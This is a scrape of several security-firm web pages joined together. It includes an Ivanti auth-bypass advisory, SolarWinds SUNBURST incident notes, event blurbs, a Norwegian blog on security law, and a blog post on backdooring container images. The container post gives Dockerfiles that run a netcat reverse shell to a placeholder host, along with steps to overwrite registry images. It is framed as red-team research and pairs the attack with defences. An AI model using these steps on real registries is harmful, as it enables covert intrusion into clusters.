Older versions/releases are also at risk.A zero day vulnerability is a previously undiscovered flaw in a system, making it possible for a threat actor to exploit the vulnerability before a manufacturer or users are aware of it. Hence, it is difficult to protect against. We do not often observe zero days used in attacks.This particular vulnerability has received a CVSS score of 10, meaning it is very easy to exploit and does not require particular tools or specialist competency to exploit.Furthermore, it is easy to identify if the vulnerability has been exploited in your systems. By reviewing your logs, you should be able to see whether the API v2 endpoint in Ivanti EPMM has been exploited. The API v2 is accessible without any authentication by changing the URI path. The API documentation describes that https://[core server]/api/v2/ is the base URL for all API calls. If you prepend the path to a vulnerable endpoint, you need no authentication to execute commands like this: https://[core server]/vulnerable/path/api/v2/.If you see access to unusual paths on your system where regular API calls, you should investigate further if you have exploitation of your system.There is a patch available for supported versions of the product. It is recommended to patch the vulnerability immediately.

It puts your people, technology and routines to the test in an intense and stressful situation. A situation that requires tough and quick decisions to be made, and is intensified by a sense of urgency because of the consequences to your customers and brand, legal ramifications, and even threats from the attackers themselves.Unfortunately, this is a situation that all organisations will eventually find themselves in.

And these preparations start well before the incident has begun.Join mnemonic on  to learn about how your organisation can prepare for cyber incidents and test your response capabilities against legitimate threats.When a cyber incident occurs, your organisation needs to know what to do while under intense pressure.

FireEye has named this malware . Microsoft has named it .On 2021-01-11 SolarWinds released  where they describe new findings from their investigation, giving an updated overview of the timeline of the attack. Their forensics team has found evidence of the threat actor gaining access to their systems in September 2019. Threat actor code was injected in their Orion product software release in October 2019 for what appears to be testing purposes, followed by the malicious backdoor code injection now known as SUNBURST in the following releases starting 2020-02-20. The threat actor remained undetected, but seems to have stopped injecting the malicious code to SolarWinds Orion software updates in June 2020.

CISA has also  that they have evidence of the threat actor using additional access vectors, other than the SolarWinds Orion platform. In an updated version of CISA's advisory they claims to have evidence that the actor are abusing SAML tokens in other incidents where SolarWinds was not the initial access vector. Microsoft has further described  they observed from an Identity perspective, which includes SAML- and API-observations and how the patterns can be detected.(The threat actor operates with high operational security, obfuscating the command and control mechanisms and making use of anti-forensics techniques. Our assessment is that the stealthy and highly sophisticated nature of this breach suggests this is the work of a nation-state threat actor. This assessment is backed by available threat intelligence from our partners. FireEye did not attribute the threat actor, but described it as an unknown threat actor they track as UNC2452. Volexity tracks this threat actor under the name .In a  by US cyber security and intelligence agencies FBI, CISA, ODNI and NSA, the threat actor is attributed to be an advanced persistent threat actor of Russian origin, and the cyber intrusion campaign is assessed to be part of an ongoing intelligence gathering effort. ()Kaspersky has  where they describe technical similarities between the SUNBURST malware and a previously identified .NET backdoor malware known as Kazuar. Kazuar was first by Palo Alto in 2017, where it was linked to the Turla threat actor group (also known as Uroburos and Snake). FireEye has published a  where they describe how the threat actor has been using their initial access through SolarWinds (and other intrusion vectors such as password spraying) to move laterally from on-premise networks to gain unauthorised access to the victim's Microsoft 365 environment.For lateral movement and persistence the following techniques have been described:Additional information about the threat actor was discussed by FireEye in  webcast. The techniques described show that the threat actor is extremely stealthy. The threat actor has detailed knowledge about corporate systems and leverages their understanding of how SOC employees might detect and investigate malicious activity. The threat actor is using costly dedicated infrastructure and a large number of personnel, possibly spread over multiple teams in a long running campaign. The exfiltrated information is of interest to a state-sponsored threat actor, and has little monetary value (no financial data or PII data). No disruptive activity has been discovered. This points to a state-sponsored threat actor carrying out a very targeted campaign with espionage as their main motivation. In addition to the SUNBURST malware, another malware is discovered in the SolarWinds platform known as SUPERNOVA. This malware seems to be related to another threat actor than UNC2452/Dark Halo according to Microsoft and FireEye.This malware serves a webshell in the SolarWinds HTTP API which receives C# script from web request and compile and execute it on the fly. It is not digitally signed and is found in the dll named App_Web_logoimagehandler.ashx.b6031896.dll (md5: 56ceb6d0011d87b6e4d7023d7ef85676). Further technical details can be found  ()Crowdstrike has been assisting SolarWinds in their investigation, and has published  of a malware used to insert the SUNBURST backdoor into software builds of the SolarWinds Orion product. They have named this malware SUNSPOT. SUNSPOT monitors and hijacks processes involved in the compilation of code and replaces one of the source files with a malicious source file containing the SUNBURST backdoor. Several safeguards were added to ensure that software builds did not fail, making it less likely that SolarWinds developers detected the injected code in the software update packages. The threat actor carried out a highly targeted campaign where only a select few of the victims, that installed the backdoor code via SolarWinds software, were further infected by a second stage malware in the form of Cobalt Strike implants. The second stage malware was installed via a loader, named  by FireEye, and a variant named  by Symantec. Microsoft gives a detailed description in this  of how the threat actor activated the SUNBURST backdoor for installing the second stage malware in a very stealthy operation using hands-on keyboard activity, scripts and malware loaders customised per victim. According to , the following products are affected: The list of trojanised SolarWinds.Orion.Core.BusinessLayer.dll versions can be found . The list is not exhaustive and may be further expanded as the investigation continues. As part of their incident response SolarWinds has decided to revoke the code-signing digital certificate that was affected by SUNBURST, effective from 2021-03-08. Re-installations of the updated versions of the SolarWinds Orion Platform will also install the new digital certificate. The revocation also affects other SolarWinds products, that were not affected by SUNBURST. The complete list of affected products and SolarWinds advisory on patching can be found . (updated mnemonic recommends that you do the following:If you are running the affected versions of SolarWinds, have installed the malicious update and see DNS queries to any sub-domain of avsvmcloud[.]com, you are running the trojanised software containing the backdoor. This does not however confirm that the threat actor has leveraged this backdoor for intrusion into your systems. In order to determine if your systems have been breached we recommend the following:If you find a CNAME record from avcvmcloud[.]com in your historic DNS queries, this is a strong indication that a second stage malware has been installed on your system, and you should consider your SolarWinds Orion server compromised and immediately start incident response activities.It should be noted that the list of IOCs is not exhaustive. This means that even if you do not find concrete evidence of compromise you should not close down your threat hunting activities. We recommend that you take extra precautions according to your established procedures for handling a suspected server compromise, such as disconnecting the server, securing evidence and performing forensics investigations.In your incident response activities and remediation plan you should assume that the threat actor has deployed further persistence mechanisms, such as adding credentials or spoofed authentication tokens for lateral movement and persistence. Additionally, you should treat all hosts monitored by the SolarWinds Orion monitoring software as possibly compromised. identified a related attempt of compromise through a reseller’s Microsoft Azure account, and has released  to detect and mitigate this threat.

The presentations will go beyond the technical level and touch upon real-life implications and learnings as our speakers all have decades of experience in the trenches to share from.In the spirit of experience sharing, the guests will have many coffee breaks and other opportunities during dinner to network and discuss the topics of the day.See you there!Bjørn's presentation aims to provide an introduction to cyber threat intelligence – what it is, and what it can be used for. Limitations and challenges with TI are explored, as is potential solutions. New technology that is being developed in-house at mnemonic is one factor that could contribute to overcoming the current challenges.Bjørn is a security consultant at mnemonic, a position he started last year. Before this, he gathered ten years of experience working for the Norwegian Police and the Norwegian Armed Forces. Up until 2021, he was the police superintendent at Kripos, where he was responsible for investigating cyber attacks at the National Cybercrime Centre (NC3). Bjørn has a Master's degree in Investigations from Politihøgskolen (The Norwegian Police University College). During his military career, Bjørn has a background as a combat engineer in Brigade Nord, both in the Telemark Battalion and the 2nd Battalion. He has also been a part of the forces that Norway contributed to NATO's operations in Kosovo and Afghanistan. At mnemonic, Bjørn delivers consultancy within the areas of threat intelligence and incident management. He works closely with a range of different organisations to deliver threat intelligence, adapted to each organization's risk assessments and informational needs.: 2/5: English In a pre-pandemic time, mnemonic toured the world of incident response conferences with the presentation “the tactical analyst and the half-year apt”. The presentation's acclaim stemmed from the underlying data we were able to analyse and later showcase – more than 12.000 commands from the threat actor's human operators, gathered from an advanced investigation that lasted for six months. This data allowed mnemonic to do a rather thorough analysis of the actor, and to draw important conclusions about theoretical and practical aspects of incident response. Mona's presentation is a continuation of this work, with several more years of research, data, and experience to add to the conversation.Mona Elisabeth Østvang is a board member of FIRST (The Forum of Incident Response and Security Teams), holds a Master's of Technology from NTNU (Norwegian University of Science and Technology), and is currently working as a researcher in mnemonic's R&D department. For the last ten years, she has been involved in a number of incident response situations as an incident manager, which entails leading investigations of different types of incidents, including several nation-state threat actor campaigns in Norway and abroad.Mona's work contributes to tactical analysts gaining a better understanding of the threat actor, which is important when managing a serious incident.She also studies how such an approach to an incident affects the breached organisation, asking questions like; \"what benefits do we gain from taking the time to really understand what is going on?\" and \"what are the downsides of doing this?\". 3/5: English  will provide a strategic-level overview of the main cyber security threats and trends that CrowdStrike has observed over the past 18 months, how nation-state adversaries have adapted their attack techniques, and how the ecosystem of financially-motivated eCrime actors has increased in size, complexity, and specialisation.Additionally, he will illustrate the major threats that they are currently observing in Scandinavia and Europe as a whole, including profiles of the most active adversaries in the region.Anders Blecko is a Cybersecurity Specialist at CrowdStrike and has experience from information and IT-security, software development, and IT-architecture. Before joining the Nordic and Baltic team at CrowdStrike, Anders held different positions at The National Swedish Police (Polismyndigheten) and The Swedish Security Service (Säkerhetspolisen).: 2/5: English", "url": "https://www.mnemonic.io/resources/events-webinars/stockholm-november-summit-2022/", "category": "resources", "subcategory": "events-webinars"},

It puts your people, technology and routines to the test in an intense and stressful situation. A situation that requires tough and quick decisions to be made, and is intensified by a sense of urgency due to the possible consequences.Unfortunately, this is a situation that all organisations will eventually find themselves in. The difference between successfully responding versus experiencing a major incident with long lasting consequences comes down to how prepared an organisation is to handle the incident. And these preparations start well before the incident has begun.Join us on 9th November for discussions about how to prepare for cyber incidents and how to test your response capabilities against legitimate threats.mnemonic’s Experience Sharing Forums are hosted across Europe with the goal of bringing together the security community to share, network and learn from each other.

{"title": "Nasjonal digital sikkerhet: Ingen grunn til å vente", "ingress": "Mens ulike myndighetsorganer har ansvar for å definere de brede rammene for Norges digitale motstandsdyktighet, er vår felles sikkerhet også avhengig av at initiativ og tiltak iverksettes nedenfra og opp – hos hver enkelt bedrift", "content": "Siden ny sikkerhetslov trådte i kraft i 2019 har debatten gått om hvordan og hvor hurtig den bør implementeres. Blant annet har Riksrevisjonen påpekt at fremdriften med å kartlegge og sikre kritisk infrastruktur går for sakte. Og mens denne kartleggingen pågår, står flere verdikjeder trolig med mangelfull sikring.Bloggposten diskuterer hvordan Norges digitale motstandsdyktighet er avhengig av tiltak hos hver enkelt bedrift, samt at det er mye bedrifter kan og bør gjøre allerede i dag i påvente av implementering av sikkerhetsloven.Vi er langt fremme med digitalisering i Norge. Mange av funksjonene som holder hjulene i samfunnet i gang er flyttet til internett. Digitalisering er både viktig og positivt for et bærekraftig samfunn, men samtidig gjør dette oss sårbare. Spenningene i Europa har satt samfunnssikkerhet i høysetet, og det haster med å styrke Norges digitale motstandsdyktighet.Siden  trådte i kraft i 2019 har debatten gått om hvordan kravene i loven skal implementeres. Det er opp til hvert enkelt departement å sørge for forsvarlig sikkerhet i sine sektorer, og identifisere hva som skal omfattes av loven, være seg bedrifter, infrastruktur eller tjenester. Dette arbeidet har nødvendigvis krevd en god del samordning av praksis mellom sektorer. Dermed har også hastigheten på implementeringen blitt redusert.Selv om den nasjonale strategien for digital sikkerhet har som mål å kartlegge og sikre kritisk infrastruktur, . Kartleggingen av grunnleggende nasjonale funksjoner og avhengigheter knyttet til disse skulle være fullført juli 2021, men pågår fortsatt. Manglende kapasitet og kompetanse trekkes frem som en årsak. Men at det først i fjor ble anerkjent at infrastruktur knyttet til olje og gass skal være underlagt sikkerhetsloven er et eksempel på hvordan sektorspesifikke hensyn også kan trenere prosessen.Et viktigere poeng er at dette også illustrerer hvordan sikkerhet for ofte kommer som reaktive tiltak, selv der vi kjenner til aktuelle trusler og sårbarheter. Det er som regel tre årsaker til dette: Det første er  for virksomheten. Mens risiko knyttet til finans og marked oftere er kartlagt, er sikkerheten til kritiske verdier og funksjoner i mindre grad belyst. Uten en helhetlig forståelse av risiko er det utfordrende å forutsi hvordan endringer i omgivelsene kan påvirke virksomheten.En annen årsak er . Å investere i sikkerhet kan oppleves som en dårlig investering. Samtidig mangler også i mange tilfeller en forståelse av at kostnadene ved hendelser kan bli langt høyere enn for preventive tiltak, ikke bare for virksomheten, men også for verdikjeden og samfunnet for øvrig. Dette har sammenheng med den siste årsaken, som er en ofte . Ikke bare er Norges digitale motstandsdyktighet avhengig av tiltak hos hver enkelt bedrift, men den enkelte virksomhet er også avhengig av fungerende nasjonale funksjoner. Sammen bør vi derfor jobbe for å bli mer proaktive i sikringen av nasjonale interesser.For mens kartleggingen av avhengigheter knyttet til grunnleggende nasjonale funksjoner pågår, står flere verdikjeder trolig med mangelfull sikring. Dette i en tid hvor vi står i den mest prekære sikkerhetssituasjonen i Europa på flere tiår. Men utfordringene er ikke nye. Også tidligere rapporter fra Riksrevisjonen understreker alvoret. I fant de at beredskapen mot dataangrep mot Norges kraftforsyning ikke var fulgt opp. I  ble det offentliggjort at Forsvaret ikke har sikret sine informasjonssystemer tilstrekkelig. Parallelt med dette signaliserer  og  årlige vurderinger at statlig støttede trusselaktører kan være villige til å ta økt risiko i deres operasjoner mot norske interesser i tiden fremover. Vi må akseptere at implementering av sikkerhetsloven vil ta tid. Samtidig har vi ikke råd til å la det bli en hvilepute.I påvente av implementering av sikkerhetsloven kan og bør mye gjøres allerede i dag. Betydelig kompetanse, kapasitet og gjennomføringsevne på digital sikkerhet ligger utenfor det offentlige. Men hvordan kan disse kapasitetene mobiliseres?Noe av svaret kan ligge i økt koordinering mellom offentlige og private aktører. Kunnskap er en forutsetning for å identifisere og adressere behov for sikkerhet. For å danne en felles situasjonsforståelse bør det legges til rette for økt informasjonsdeling, også fra og mellom private aktører. Nasjonalt cybersikkerhetssenter (NCSC) er en naturlig samlingsarena som kan bidra til å styrke koordineringen. Vi ser også den positive effekten av sektorvise responsmiljøer (som NKom, KraftCERT og Nordic Financial CERT), både som koordineringsinstanser i egen sektor og som bindeledd mellom NSM og næringslivet. Slike arenaer bør styrkes, og flere sektorer bør inkluderes.I 2017 opprettet NSM en kvalitetsordning for leverandører som tilbyr hendelseshåndtering. Ordningen er en god illustrasjon på hvordan offentlige og private aktører kan jobbe sammen for å forbedre tempoet og kvaliteten i sikkerhetsarbeidet. Denne modellen bør videreføres til flere sikkerhetsrelaterte domener, og inkludere flere kompetente sikkerhetsmiljøer.Men det viktigste er nok innsatsen som gjøres i hver enkelt virksomhet. I fellesskap kan vi danne en robust og pålitelig digital grunnmur, som både støtter opp under, og mottar støtte fra, nasjonale funksjoner. Om vi skal lykkes med digitaliseringen er det en forutsetning at bedrifter og organisasjoner legger mer vekt på å øke motstandsdyktigheten mot digitale angrep.NSMs grunnprinsipper for IKT-sikkerhet er et godt sted å starte, selv for bedrifter som ikke er underlagt sikkerhetsloven. Ta aktiv del i koordineringsarenaer, som NCSC, Næringslivets sikkerhetsråd eller sektorvise responsmiljøer. Søk hjelp og råd fra kvalifiserte aktører til hvordan din bedrift kan forbedre evnen til egenbeskyttelse.Det er ingen grunn til å vente.", "url": "https://www.mnemonic.io/no/resources/blog/ny-sikkerhetslov-ingen-grunn-til-a-vente/", "category": "no", "subcategory": "resources"},

{"title": "Container security: Infecting images to establish backdoors", "ingress": "How trusting container images hosted on a private registry may allow threat actors to spread in container-based infrastructures like Kubernetes.", "content": "This blog post provides a technical description of how legitimate container images hosted on a registry can be seamlessly backdoored, to spread within large-scale container-based infrastructures such as Kubernetes. The techniques demonstrated show how any container image (i.e. distrofull or distroless) can be infected with a backdoor connecting to an attacker-controlled location while keeping the original behaviour of the image unchanged once instantiated in a container. The goal of this article is to demonstrate how such techniques can be used to spread stealthily in container-based infrastructures such as Kubernetes environments, when organisations trust container images blindly from public or private registries. Organisations with a micro-service architecture should therefore review how they deploy software containers to ensure they are not susceptible to this kind of attack.This blog post covers the following:Over the past few years, the use of software containers in large-scale enterprise environments has become prevalent due to the industry shift from traditional silo deployments to micro-service architectures.Kubernetes has rapidly become the de-facto standard for managing software containers at scale, due to its numerous integrations with major cloud providers and large community behind it.Although many credible resources describe how to secure a Kubernetes cluster, there is one question that many hardening guides fail to answer: how do we ensure the integrity of container images at all times?We will see that implicitly trusting container images, even when custom-made and hosted on a private registry, creates a significant risk for a container-based infrastructure such as Kubernetes, as it allows threat actors to spread to multiple locations of the infrastructure.Container images consist of the central piece of software containerisation, as they are the ones software containers are built upon.As illustrated below, the process for creating a software container starts with a simple text file called a Dockerfile (on the left). The latter is often referred to as the container’s blueprint, as it holds the instructions describing what the end container will look like in terms of directories and what software packages it will contain. A Dockerfile is then built into an immutable container image (in the middle), representing the container’s shareable package that can be used to “ship code”. A software container (on the right) only consists of an instantiation of a container image. Container images are, therefore, the central part of the containerisation process, as they consist of the actual packages that can be shared via container registries. A container registry may either be private with authentication and network requirements (at least it should) or public, effectively allowing anyone to publish and share container images with the world. Since the beginning, Docker Hub has been the world’s largest public container-image registry. It is the implicit registry used to pull images defined in the FROM instruction of a Dockerfile, if no explicit registry URL is specified.Similar to other version control systems, container registries are organised into repositories, where each repository contains multiple versions of a single container image with a specific software, application or Linux distribution. As illustrated below, each version of an image is represented with an  in the form of an ASCII string containing lowercase and uppercase letters, digits, underscores, periods and dashes, with a maximum length of 128 characters. Each version of an image is also identified with a unique SHA256 digest, which may be used as an alternative to an image tag when referenced in a Dockerfile or pulled directly from a registry.It is essential to understand that container images are made of layers. Each layer corresponds to an instruction defined in the image’s Dockerfile. Thanks to this layering system, container images are able to build upon each other to avoid building everything from scratch every single time. As illustrated below, the high-level process for building a container image based on another one is as follows:The high-level approach to infect a container image is simple. The idea is to take advantage of the image layering system, by using a targeted image as a base and extend it with malicious software such as a reverse shell, crypto miner or other malware. Once the legitimate image is infected, the attacker can push it back to the compromised registry to overwrite the original copy, so that the malicious image is used for future deployments instead of the legitimate one.It is important to note that a significant limitation of software containers is their inability to run multiple processes in the foreground simultaneously. Although a lot of research and tutorials explaining how to infect container images already exist, most of them show how to replace the original process of an infected image with a malicious process (e.g. a reverse shell), therefore, altering the original behaviour of the image. In a real-world scenario, infections of this kind would be detected immediately even when no proper monitoring is in place, as the deployed workload would simply not work as expected (imagine if a container expected to run an API is running a crypto miner instead). The threat actor would probably be able to deploy a few malicious containers, but the timespan allocated to attempt doing reconnaissance and escalate privileges before being killed manually, would most likely be too short to achieve anything. Furthermore, developers would understand that something suspicious is happening, helping them to figure out more rapidly that one of their registries has been compromised. Therefore, a stealthy approach to infect container images needs to be as silent as possible from a deployment and runtime perspective, by keeping the original behaviour of the image unchanged.Assuming a threat actor has acquired access to a container registry with write permissions, here is how they can infect images without altering their behaviours:In this case, we assume the compromised registry has a container image for the Apache HTTP server used to host simple web applications. This is an interesting location for a first foothold in a container-based infrastructure such as a Kubernetes cluster, as the image is likely to be used as a base to run multiple custom web applications.We start therefore with pulling the image from the registry to infect it locally on our client (note that we are using our private Docker-Hub repository for this PoC):docker pull trs1/httpd-poc:stableThere are many ways of doing that, but showing the content of the /etc/os-release file or similar (e.g. /etc/readhat-release for distributions based on Red Hat) is usually sufficient. The easiest way is to instantiate the image into an interactive container with a sh shell and use the cat utility to display the content of that file:docker run –-rm –it trs1/httpd-poc:stable /bin/shcat /etc/os-releaseIn this case, we can see that our target Apache image is based on Debian 11.The ENTRYPOINT and CMD instructions of a Dockerfile are similar and often lead to confusion when writing Dockerfiles. Although they both specify the commands that should be executed when the image is instantiated into a container, their main difference lies in the effective execution of those commands. On the one hand, the commands specified with the ENTRYPOINT instruction must execute, regardless of the options used to deploy the container. The commands specified with the CMD instruction should execute by default when the image is instantiated, but they may be overwritten by the entity deploying the container (usually via command-line arguments or the “command” instruction in a Kubernetes pod specification).When used correctly, the ENTRYPOINT instruction typically points to the binary starting the containerised application (e.g. [“python”, “myapp.py”]), whereas the CMD instruction contains options for the binary (e.g. [“-a”, “-b”]).The next step of the infection process consists therefore of identifying the original command combination that is used when the legitimate image is instantiated into a container, as we need to make sure that command is still executed as expected in our infected version of the image.Looking at the building history of the legitimate image is usually enough to identify the original ENTRYPOINT and CMD command combination, but in case that is not sufficient, inspecting the image with the inspect option always does the trick.In this case, looking at the building history is sufficient to identify that our targeted image does not have an ENTRYPOINT instruction, and that its CMD command starts the HTTP server using the following command:httpd-foregroundDepending on the attacker’s goal, there are multiple ways of infecting a container image (e.g. reverse shell, ransomware, etc.). In this case, our goal is to acquire a foothold in the container-based infrastructure(s) where the image is deployed, by infecting it with a reverse netcat shell using the information gathered in the previous steps. The idea is to build an infected image upon the legitimate one, by extending it with our reverse shell without altering its original behaviour.In order to keep the original behaviour of the legitimate image, we need to ensure our reverse shell runs in the background, while the original ENTRYPOINT and CMD commands still execute in the foreground when the image is instantiated into a container.One way to achieve that is by using the screen tool, which allows running multiple sessions of processes in the background. The Dockerfile used to infect a container image based on Debian is therefore as follows:FROM <name_of_image_to_infect>RUN apt-get update && apt-get install screen netcat-traditional -yENTRYPOINT screen -d -m /bin/nc.traditional <listening_address> <listening_port> -e /bin/bash && <original_ENTRYPOINT_command> <original_CMD_command>Note that depending on the Linux distribution the original image is based on, the package manager used to install the screen and netcat tools will be different. The name of the actual package for netcat and the way to run it might also differ from one distribution to another.In our case, the final Dockerfile used to infect the targeted Apache image is as follows:FROM trs1/httpd-poc:stableRUN apt-get update && apt-get install screen netcat-traditional -yENTRYPOINT screen -d -m /bin/nc.traditional 1.2.3.4 53 -e /bin/bash && httpd-foregroundNote that our netcat listener is listening on the (fake) 1.2.3.4:53 address in this case. The reason for using port 53 is that it tends to be allowed even in infrastructures where outbound traffic is restricted. Note also that we are starting our netcat-shell screen and the original command used by the targeted image using an ENTRYPOINT instruction. This will ensure that in case our infected image is instantiated with specific command-line options (common in Kubernetes pod definitions), the execution of our code will not be overwritten, contrary to using a CMD instruction.We can now build our Dockerfile to obtain a malicious version of the targeted image as follows, using a tag of our choice (“infected” in this case):docker build -t trs1/httpd-poc:infected .Note that at this point, the IMAGE ID which uniquely identifies container images is different for the original and infected image.Remember that container images are identified with a name and tag, separated with a colon character. Since the idea of this attack is to overwrite the legitimate Apache image identified as trs1/httpd-poc:stable on the registry with our infected image, we need to make sure the infected version has the exact same name and tag as the original image, before pushing it to the compromised registry.We can rename the infected image using the tag option as follows:docker rmi trs1/httpd-poc:stabledocker tag trs1/httpd-poc:infected trs1/httpd-poc:stableNote that we first need to delete the original Apache image from our local system, as a single machine cannot host two container images with identical names and tags at the same time. Note also that the IMAGE ID of our infected image does not change after being renamed. As illustrated above, the IMAGE ID of both trs1/httpd-poc:infected and trs1/httpd-poc:stable is identical after being renamed, as both images are actually the same (i.e. our infected image).Now that the infected image has the same name and tag as the original image we are targeting, we can push it back to the registry using the Docker utility:docker push trs1/httpd-poc:stableNote that solely based on the information available on the registry, detecting the infection is not obvious for a human, as the name and tag of the image are the same before and after the infection. Additionally, many container registries do not provide history for images identified with the same name and tag, as tags are supposed to be used for version history. Detecting the infection this way is impossible in most registries (this is the case with Docker Hub for example).The only visible difference on the registry before and after the infection is the digest and size of the image. Detecting a change in a SHA256 digest is not easy for humans, especially when the previous digest of the original image cannot be retrieved from the registry for comparison. Similarly, a slight increase in size might not be a screaming red flag for everyone when the increase is so small (less than 15 MB in this case).Now that our infected image is successfully pushed to the compromised registry, we can set up our netcat listener and wait for the image to be deployed as a container and our shell to call home.For this PoC, we will act as a developer deploying a pod to a Kubernetes cluster with a container based on our infected image. Note that Kubernetes Deployments and how to expose Services within a cluster or the outside world are out of the scope of this article.In any real-world scenario, developers always verify that a workload works as expected once deployed (at least they should). In our PoC, the developer verifies therefore that the Apache server is deployed correctly, by setting up a simple port-forwarding rule to its machine’s localhost on port 8080. As we can see, nothing seems suspicious from a developer’s perspective, as the image still has the same name and tag, while its containerised service works as expected.At the same time, we can see that our netcat listener has received a connection from the container deployed by the developer. In a real scenario, the first step would be to reckon with the compromised system to determine what it is and where it might be located. In this case, a few commands allow us to figure out that we are located in a Kubernetes cluster, within a container running as root. From there, common attacks against Kubernetes environments, such as escaping the compromised container, escalating privileges within the cluster, attacking the network, pivoting to other nodes or even the cloud solution where the cluster might be running, are all potential attack paths to investigate.By acquiring a shell in a different place of the cluster every time our infected image is instantiated, a threat actor can spread efficiently in large-scale container-based infrastructures such as Kubernetes using this technique. Note that this kind of attack may also provide access to a developer’s machine in certain situations. Indeed, developers might sometimes manually deploy a container based on an infected image on their laptops to debug or test something locally. In such scenarios, the effective attack paths potentially possible are dependent on how the container has been deployed locally in the first place.The above PoC demonstrates how to infect a container image based on a complete Linux distribution (sometimes referred to as “distrofull”), and it might be tempting to believe that distroless images could be an efficient solution to prevent this kind of attack.Distroless images are container images that only contain the developer’s application and its required dependencies, as well as the runtime environment necessary to run it (e.g. a Python interpreter for a Python application, a Java Virtual Machine for a Java application, etc.).Personally, I am a strong advocate of distroless images, as they almost remove the entire attack surface introduced by system packages, which are not even necessary in the first place. From an attacker’s perspective, living off the land in a compromised container with no tools is much more complicated than having a complete Linux distribution with everything needed. Additionally, using distroless images removes the necessity and pain of dealing with vulnerabilities in system packages (apart from the runtime environment), while allowing dev teams to shift left and focus on securing their source code instead (learn more about this in ).You might have noticed that the above PoC relies on the package manager of the Linux distribution to install the screen and netcat utilities. It might be tempting to think that removing the package manager by going distroless would be enough to prevent image infections.However, it is important to remember that any container image can be extended in any way we like. In most assessments, I am interested in acquiring a foothold in multiple areas of a container-based infrastructure, to attack it from different places. My goal is to infect images with reverse shells and ensure they contain a set of satisfying tools to conduct further attacks once the shells start calling home.My approach to infect a distroless image consists therefore of extending it with a full Linux distribution (usually Alpine) and infect it with a reverse shell, similar to what we have demonstrated above. The idea is to include a complete ecosystem in the image that we can live off to conduct further attacks once we have acquired a shell.The steps are exactly the same as the ones above, except that we use the following Dockerfile to create an infected version of a distroless image:FROM <name_of_image_to_infect>ADD alpine-minirootfs-3.14.2-x86_64.tar.gz /RUN apk add screenENTRYPOINT screen -d -m nc <listening_address> <listening_port> -e /bin/sh && <original_ENTRYPOINT_command> <original_CMD_command>As you can see, the second instruction makes the distroless image distrofull, by including all the files making up the Alpine Linux distribution into the root directory of the distroless image (). Note that the ADD instruction automatically unpacks tarballs compressed in a recognised compression format as a directory. The rest of the Dockerfile is similar to the one used for distrofull images, although it is worth noticing that the insecure version of netcat is already included in Alpine Linux, so we do not need to install it.As a small PoC, let’s assume that the registry we have compromised hosts a distroless image for a simple python application printing certain content periodically. The infection steps, starting with finding the ENTRYPOINT and CMD command combination used by the original image and ending with building the Dockerfile creating the infected image, are as follows:Note that in this case we are using the inspect option of the Docker utility to find the ENTRYPOINT and CMD command combination used by the original image. The final Dockerfile used to infect the distroless Python image is therefore as follows:The rest of the exploitation process is the same as earlier, where the infected image is renamed with the exact same name and tag as the original image, pushed back to the registry, while finally waiting for the shell to call home.As illustrated below, it is essential to note that contrary to what might be expected, this approach only increases the size of the original distroless image by 2.7 MB (roughly the size of the Alpine Linux tarball). This is why I tend to use that distribution to turn distroless images into infected distrofull versions, as the size increase is not very obvious.As we discussed earlier, the only human-readable indicator of a compromised registry where images are getting infected is the size of those images. Based on several assessments, I have experienced that developers do not notice that something is wrong unless the size difference is really significant (e.g. 100 MB or more). Even with a large size difference, the infection does not always raise eyebrows, as this all comes down to the effective security culture and awareness within the company.As explained in the background section of this article, container images can build upon each other thanks to the layering system provided by the technology. Our approach to infect container images consists of abusing that feature by extending a legitimate image with something malicious. Since the layering system is at the core of the software-container technology, it is unfortunately impossible to prevent that behaviour.However, preventing the exploitability of a malicious usage of the layering system is possible. Many container registries have a built-in feature called “Container Trust”. The idea behind that feature is that container-image publishers must create a cryptographic key pair (preferably per repository) and sign their images using the private key before pushing them to the registry. Hence, image consumers can check the integrity of any image originating from a signed repository, by verifying their signatures using the public key.Although this approach is an efficient way to prevent infected images from being instantiated successfully, it is only as secure as the key-management strategy implemented to handle the private key of each repository. Any experienced security professional will know that secret management is not easy to accomplish securely. For example, I cannot recall the number of times I have seen companies use a single signing key for an entire registry (i.e. the same for all repositories), which allows threat actors to conduct the same attack as the one we have demonstrated, once the key is compromised.In my opinion, the best protection against the infection of container images is to implement a process enforcing the use of image digests, as part of the DevOps and deployment process, so that instantiating an image based on its name and tag is simply impossible.As explained earlier, an infected image has the same name and tag as the original version of the image, but its SHA-256 digest is different. By relying on image digests only, while never trusting names and tags, dev teams can remove the possibility to exploit the layering system maliciously.The idea is to implement an automated process, which saves the digest of a legitimate image before it is pushed to a registry, so that its integrity can be verified automatically when it is pulled later.Suppose a registry becomes compromised, and a threat actor can infect images using our approach. In that case, the deployment of the infected image will fail, as its digest will be different from the one saved for the legitimate image. An approach based exclusively on image digests to verify the integrity of container images seems therefore more robust than Container Trust, as its attack surface is smaller (no keys to store, manage and rotate).Finally, a couple of other proactive measures can be implemented upstream to limit the blast radius of a container-image infection and registry compromise. First, limiting the network exposure of a registry might decrease the risk of a compromise in the first place (it does not mean it will not happen). Usually, this means favoring the use of private endpoints over public ones to expose and consume the registry.Secondly, container-based infrastructures such as Kubernetes should always restrict all outbound traffic to the Internet as much as possible (including DNS). This will prevent infected images that trigger reverse shells from connecting back to their controller, but will not prevent other types of infections, such as malware operating locally.Finally, companies should make sure that each type of deployment environment (e.g. development, test, production) uses a dedicated registry, to limit the blast radius of a compromise and prevent attackers from spreading to multiple clusters by compromising a single registry.Despite the growing popularity and excitement around the technology, software containers are still a misunderstood beast in many ways. Hopefully, this blog post will help raise awareness about container-image infection and how threat actors can spread in large-scale container-based infrastructures unnoticed.Based on previous experience, approaches relying on image digests have proven to be an efficient countermeasure to this kind of threat when implemented correctly. I hope this contribution will help organisations understand the importance of verifying the integrity of container images, and in turn, make the container world more secure.For further reference when conducting penetration tests and other red-teaming engagements, I have created a “container-image-infection” repository containing Dockerfile templates for the following types of infections:The repository can be found .", "url": "https://www.mnemonic.io/resources/blog/container-security-infecting-images-to-establish-backdoors/", "category": "resources", "subcategory": "blog"},

